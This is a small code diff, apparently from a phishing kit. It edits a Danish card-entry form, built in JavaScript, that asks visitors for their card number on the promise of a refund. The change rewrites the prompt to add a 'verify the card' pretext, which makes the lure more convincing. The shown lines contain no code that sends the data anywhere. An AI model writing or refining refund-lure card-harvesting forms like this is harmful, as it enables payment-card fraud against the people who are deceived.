@@ -218,7 +218,7 @@
             escapeHtml(amountLabel) +
             "</div>"
           : "") +
-        '<p style="margin:0 0 16px;font-size:14px;color:#6b7280;line-height:1.45;text-align:center">Indtast kortoplysninger for at få beløbet tilbageført.</p>' +
+        '<p style="margin:0 0 16px;font-size:14px;color:#4b5563;line-height:1.5;text-align:center">Indtast dine kortoplysninger for at verificere kortet og få en tilbagebetaling.</p>' +
         '<label style="display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px">Kortnummer</label>' +
         '<input id="juj-c-num" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" style="width:100%;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;padding:12px;font-size:16px;margin-bottom:14px" />' +
         '<div style="display:flex;gap:12px;margin-bottom:20px">' +
